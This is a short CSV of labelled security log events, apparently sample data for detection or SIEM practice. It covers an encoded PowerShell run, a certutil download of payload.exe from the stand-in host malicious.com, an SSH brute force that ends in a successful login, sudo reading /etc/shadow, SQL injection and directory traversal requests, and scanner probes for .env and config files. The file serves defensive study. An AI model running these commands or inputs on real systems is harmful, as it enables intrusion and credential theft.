timestamp,source,event_type,user,src_ip,process_name,command_line,url,status,message
2026-05-16 10:20:11,windows,process_creation,Aayushi,192.168.1.5,powershell.exe,"powershell.exe -enc aQBlAHg=",,,"PowerShell encoded command executed"
2026-05-16 10:22:11,windows,process_creation,Aayushi,192.168.1.5,certutil.exe,"certutil.exe -urlcache -f http://malicious.com/payload.exe payload.exe",,,"Certutil used to download file"
2026-05-16 10:24:01,linux,auth,root,45.33.21.10,,,,,"Failed password for root from 45.33.21.10 port 22 ssh2"
2026-05-16 10:24:15,linux,auth,root,45.33.21.10,,,,,"Failed password for root from 45.33.21.10 port 22 ssh2"
2026-05-16 10:24:35,linux,auth,root,45.33.21.10,,,,,"Failed password for root from 45.33.21.10 port 22 ssh2"
2026-05-16 10:25:02,linux,auth,root,45.33.21.10,,,,,"Failed password for root from 45.33.21.10 port 22 ssh2"
2026-05-16 10:25:27,linux,auth,root,45.33.21.10,,,,,"Failed password for root from 45.33.21.10 port 22 ssh2"
2026-05-16 10:25:58,linux,auth,root,45.33.21.10,,,,,"Failed password for root from 45.33.21.10 port 22 ssh2"
2026-05-16 10:26:40,linux,auth,admin,45.33.21.10,,,,,"Accepted password for admin from 45.33.21.10 port 22 ssh2"
2026-05-16 10:27:10,linux,auth,aayushi,192.168.1.20,,,,,"sudo: aayushi : TTY=pts/0 ; PWD=/home/aayushi ; USER=root ; COMMAND=/bin/cat /etc/shadow"
2026-05-16 10:30:12,web,http,,103.22.44.12,,,"/login.php?id=1' OR '1'='1",500,"Possible SQL injection attempt"
2026-05-16 10:31:05,web,http,,103.22.44.12,,,"/../../etc/passwd",404,"Directory traversal attempt"
2026-05-16 10:32:01,web,http,,88.77.66.55,,,"/admin",404,"Admin panel probing"
2026-05-16 10:32:05,web,http,,88.77.66.55,,,"/wp-login.php",404,"Admin panel probing"
2026-05-16 10:32:11,web,http,,88.77.66.55,,,"/phpmyadmin",404,"Admin panel probing"
2026-05-16 10:32:17,web,http,,88.77.66.55,,,"/backup.zip",404,"Scanner probing"
2026-05-16 10:32:22,web,http,,88.77.66.55,,,"/config.php",404,"Scanner probing"
2026-05-16 10:32:29,web,http,,88.77.66.55,,,"/.env",404,"Scanner probing"
